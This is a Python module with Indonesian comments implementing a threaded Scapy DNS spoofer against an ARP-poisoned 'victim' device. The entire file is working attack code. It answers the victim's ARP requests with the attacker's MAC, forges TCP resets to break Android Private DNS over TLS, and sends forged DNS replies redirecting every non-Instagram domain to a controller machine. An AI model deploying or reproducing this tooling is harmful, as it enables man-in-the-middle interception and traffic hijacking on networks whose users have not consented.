#!/usr/bin/env python3
"""
Thread-Safe Scapy DNS Spoofer
=============================
Menangkap permintaan DNS (UDP 53) dari perangkat korban yang di-ARP poison,
memvalidasi terhadap whitelist domain (Instagram Walled Garden), dan membelokkan
seluruh domain selain Instagram ke alamat IP Komputer Pengawas (Controller).
"""

import socket
import threading
import time
from typing import Set, Optional
from scapy.all import Ether, IP, TCP, UDP, ARP, DNS, DNSQR, DNSRR, sendp, conf
from ...utils.logger import logger

# Domain resmi ekosistem Instagram yang diizinkan tembus ke internet
INSTAGRAM_DOMAINS = (
    "instagram.com",
    "cdninstagram.com",
    "ig.me",
    "facebook.com",
    "fbcdn.net",
    "fbsbx.com"
)

class DNSSpoofer:
    def __init__(self, target_ip: str, target_mac: str, controller_ip: str, interface, self_mac: str, gateway_ip: str = ""):
        self.target_ip = target_ip
        self.target_mac = target_mac
        self.gateway_ip = gateway_ip
        self.controller_ip = controller_ip
        self.interface = interface
        self.self_mac = self_mac

        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self._running = False

    @staticmethod
    def is_whitelisted(domain: str) -> bool:
        domain = domain.lower().rstrip(".")
        return any(domain == w or domain.endswith("." + w) for w in INSTAGRAM_DOMAINS)

    def _process_packet(self, pkt):
        """Proses paket masuk: Reactive ARP, DoT Port 853 RST, dan DNS Port 53."""
        try:
            # 1. VEKTOR A: REACTIVE ARP SPOOFING (Menangkal Unsolicited ARP Filter)
            # Jika korban bertanya 'who has <gateway_ip>', jawab seketika <gateway_ip> is-at <self_mac>
            if pkt.haslayer(ARP) and pkt[ARP].op == 1:
                arp = pkt[ARP]
                if self.gateway_ip and arp.pdst == self.gateway_ip:
                    reply = (
                        Ether(dst=self.target_mac, src=self.self_mac) /
                        ARP(
                            op="is-at",
                            psrc=self.gateway_ip,
                            pdst=self.target_ip,
                            hwsrc=self.self_mac,
                            hwdst=self.target_mac
                        )
                    )
                    sendp(reply, iface=self.interface, verbose=False)
                    logger.debug(f"⚡ [Reactive ARP] Instantly replied to {self.target_ip} ({self.gateway_ip} is-at {self.self_mac})")
                    return

            # 2. VEKTOR B: DNS-OVER-TLS (TCP Port 853) RESET
            # Android modern otomatis mencoba port 853 (Private DNS).
            # Kita kirim TCP RST agar Android seketika membatalkan DoT dan fallback ke UDP 53!
            if pkt.haslayer(TCP) and pkt[TCP].dport == 853 and pkt.haslayer(IP):
                rst = (
                    Ether(dst=self.target_mac, src=self.self_mac) /
                    IP(src=pkt[IP].dst, dst=pkt[IP].src) /
                    TCP(
                        sport=pkt[TCP].dport,
                        dport=pkt[TCP].sport,
                        seq=0,
                        ack=pkt[TCP].seq + 1,
                        flags="RA"
                    )
                )
                sendp(rst, iface=self.interface, verbose=False)
                logger.info(f"🚫 [DoT Reset] Reset Private DNS (Port 853) dari {self.target_ip} -> Paksa fallback ke UDP 53")
                return

            # 3. VEKTOR C: UDP PORT 53 DNS SPOOFER
            if not pkt.haslayer(DNS) or not pkt.haslayer(DNSQR):
                return

            dns = pkt[DNS]
            # Hanya proses DNS Query standar (qr == 0, opcode == 0)
            if dns.qr != 0 or dns.opcode != 0:
                return

            qname = dns[DNSQR].qname.decode("utf-8", errors="ignore").rstrip(".")
            qtype = dns[DNSQR].qtype

            # Walled Garden: Jika domain adalah Instagram, selesaikan ke IP asli agar korban BISA buka Instagram
            if self.is_whitelisted(qname):
                try:
                    real_ip = socket.gethostbyname(qname)
                    an_record = DNSRR(rrname=dns[DNSQR].qname, type="A", rclass="IN", ttl=60, rdata=real_ip)
                    logger.info(f"🌐 [DNS Spoofer] Walled Garden passthrough {qname} -> {real_ip} untuk {self.target_ip}")
                except Exception:
                    an_record = None
            elif qtype == 1:
                # Query IPv4 (A record): Arahkan ke Controller IP
                an_record = DNSRR(rrname=dns[DNSQR].qname, type="A", rclass="IN", ttl=10, rdata=self.controller_ip)
                logger.info(f"🎯 [DNS Spoofer] Intercepted query '{qname}' (type {qtype}) from {self.target_ip} -> Spoof to {self.controller_ip}")
            else:
                # Query IPv6 (AAAA), HTTPS (65), dsb: Respon NODATA (an=None)
                # Standar RFC 3596/4074: Memaksa Android/Chrome segera fallback ke IPv4 A-record
                an_record = None

            src_mac = self.target_mac or (pkt[Ether].src if pkt.haslayer(Ether) else None)
            src_ip = pkt[IP].src if pkt.haslayer(IP) else self.target_ip
            dst_ip = pkt[IP].dst if pkt.haslayer(IP) else self.controller_ip
            sport = pkt[UDP].sport if pkt.haslayer(UDP) else 53

            resp = (
                Ether(dst=src_mac, src=self.self_mac) /
                IP(src=dst_ip, dst=src_ip) /
                UDP(sport=53, dport=sport) /
                DNS(
                    id=dns.id,
                    qr=1,
                    aa=1,
                    rd=dns.rd,
                    ra=1,
                    rcode=0,
                    qd=dns.qd,
                    an=an_record
                )
            )

            # Kirim respons DNS ganda ke interface aktif
            sendp(resp, iface=self.interface, verbose=False)
            sendp(resp, iface=self.interface, verbose=False)

        except Exception as e:
            logger.debug(f"Notice handling redirector packet: {e}")

    def _worker(self):
        """Worker thread yang mendengarkan paket UDP 53, TCP 853, dan ARP target."""
        logger.info(f"🎧 [DNS Spoofer] Multi-Vector Listener aktif untuk target {self.target_ip} (MAC: {self.target_mac})...")
        
        # BPF Filter menangkap:
        # 1. DNS UDP Port 53 dari target IP
        # 2. DoT TCP Port 853 dari target IP
        # 3. ARP Broadcast dari target MAC (Reactive Spoofing)
        mac_clause = f" or (arp and ether src {self.target_mac})" if self.target_mac else ""
        bpf_filter = f"(udp and port 53 and src host {self.target_ip}) or (tcp and dst port 853 and src host {self.target_ip}){mac_clause}"

        from scapy.all import sniff
        while not self._stop_event.is_set():
            try:
                sniff(
                    iface=self.interface,
                    filter=bpf_filter,
                    prn=self._process_packet,
                    store=0,
                    timeout=0.5
                )
            except Exception as e:
                if not self._stop_event.is_set():
                    logger.debug(f"Notice in DNS sniffer loop: {e}")
                    time.sleep(0.2)

        logger.info(f"🛑 [DNS Spoofer] Listener untuk {self.target_ip} dihentikan.")

    def start(self):
        """Mulai DNS Spoofer di background thread."""
        if self._running:
            return
        self._stop_event.clear()
        self._running = True
        self._thread = threading.Thread(target=self._worker, daemon=True, name=f"DNSSpoof-{self.target_ip}")
        self._thread.start()

    def stop(self):
        """Hentikan DNS Spoofer secara mulus."""
        if not self._running:
            return
        self._stop_event.set()
        if self._thread and self._thread.is_alive():
            self._thread.join(timeout=2.0)
        self._running = False
